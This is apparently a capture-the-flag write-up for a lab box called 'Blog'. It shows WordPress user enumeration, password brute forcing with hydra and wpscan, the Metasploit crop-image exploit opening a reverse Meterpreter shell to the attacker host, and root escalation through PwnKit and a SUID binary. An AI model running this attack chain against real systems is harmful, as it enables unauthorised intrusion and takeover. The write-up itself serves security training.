Billy Joel made a blog on his home computer and has started working on it.  It's going to be so awesome!
Enumerate this box and find the 2 flags that are hiding on it!  Billy has some weird things going on his laptop.  Can you maneuver around and get what you need?  Or will you fall down the rabbit hole...
In order to get the blog to work with AWS, you'll need to add blog.thm to your /etc/hosts file.
I found a wordpress blog : http://blog.thm/wp-login.php and also the version is 5.0
it's vulnerable to 	`CVE-2019-8943`
found : https://github.com/v0lck3r/CVE-2019-8943 and : https://www.exploit-db.com/exploits/49512
But for this exploit i need to be authenticated
on author i found : http://blog.thm/author/kwheel/ kwheel.
Here i will first try the exploit, or i can try to bruteforce this username password
I will try to use wpscan to find more users
```
└─# wpscan --url http://blog.thm/ --enumerate u
[i] User(s) Identified:

[+] kwheel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Login Error Messages (Aggressive Detection)

[+] bjoel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Karen Wheeler
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)

[+] Billy Joel
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)

```
found 4 user, now i will try to bruteforce them
```
└─# hydra -L users.txt -P /usr/share/wordlists/rockyou.txt blog.thm -V http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:S=302" 
```
Very slow i used also this:
```
wpscan --url http://blog.thm -P /usr/share/wordlists/rockyou.txt -U username.txt -t 75
```
and Burp Pro

After a lot of patience, i found 
`[80][http-post-form] host: blog.thm   login: kwheel   password: cutiepie1`
logged in

## SHell
Now i will use the CVE that i found first, for that i use their metasploit module
`   0  exploit/multi/http/wp_crop_rce                    2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload`
```
msf6 exploit(multi/http/wp_crop_rce) > run

[*] Started reverse TCP handler on 10.4.26.216:4444 
[*] Authenticating with WordPress using kwheel:cutiepie1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (39927 bytes) to 10.10.206.103
[*] Attempting to clean up files...
[*] Meterpreter session 1 opened (10.4.26.216:4444 -> 10.10.206.103:47004) at 2023-10-24 20:12:39 +0000


meterpreter > 

```
Successfuly got a meterpreter

## Escalation
I will try SUID

```
www-data@blog:/tmp$ find / -type f -perm /4000 -ls 2>/dev/null  
   394811     40 -rwsr-xr-x   1 root     root        37136 Mar 22  2019 /usr/bin/newuidmap
   394847     24 -rwsr-xr-x   1 root     root        22520 Mar 27  2019 /usr/bin/pkexec
   394605     76 -rwsr-xr-x   1 root     root        76496 Mar 22  2019 /usr/bin/chfn
   394952    148 -rwsr-xr-x   1 root     root       149080 Jan 31  2020 /usr/bin/sudo
   394554     52 -rwsr-sr-x   1 daemon   daemon      51464 Feb 20  2018 /usr/bin/at
   415459     12 -rwsr-sr-x   1 root     root         8432 May 26  2020 /usr/sbin/checker


```
for SUID i have pkexec which is Pwnkit, also i have checker that i don't know.
first i will use pkexec
```
www-data@blog:/tmp$ chmod +x pkexec.py
chmod +x pkexec.py
www-data@blog:/tmp$ python3 pkexec.py
python3 pkexec.py
Do you want to choose a custom payload? y/n (n use default payload)  n
n
[+] Cleaning pervious exploiting attempt (if exist)
[+] Creating shared library for exploit code.
[+] Finding a libc library to call execve
[+] Found a library at <CDLL 'libc.so.6', handle 7fe8952c0000 at 0x7fe895149ba8>
[+] Call execve() with chosen payload
[+] Enjoy your root shell
# id
id
uid=0(root) gid=33(www-data) groups=33(www-data)
```
2nd i will use Checker
When i execute it
```
www-data@blog:/tmp$ /usr/sbin/checker
/usr/sbin/checker
Not an Admin
```
I will use strings to examine it
```
strings /usr/sbin/checker
admin
/bin/bash
Not an Admin
;*3$"
```
```
www-data@blog:/tmp$ export admin=admin
export admin=admin
www-data@blog:/tmp$ /usr/sbin/checker
/usr/sbin/checker
root@blog:/tmp#
root@blog:/tmp# id;hostnamectl
id;hostnamectl
uid=0(root) gid=33(www-data) groups=33(www-data)
   Static hostname: blog
         Icon name: computer-vm
           Chassis: vm
        Machine ID: a48aa1b7b471491790e2497ef04d3ae8
           Boot ID: 6a761d8160eb4321a14dca7b09043c5e
    Virtualization: xen
  Operating System: Ubuntu 18.04.4 LTS
            Kernel: Linux 4.15.0-101-generic
      Architecture: x86-64
root@blog:/tmp# 
```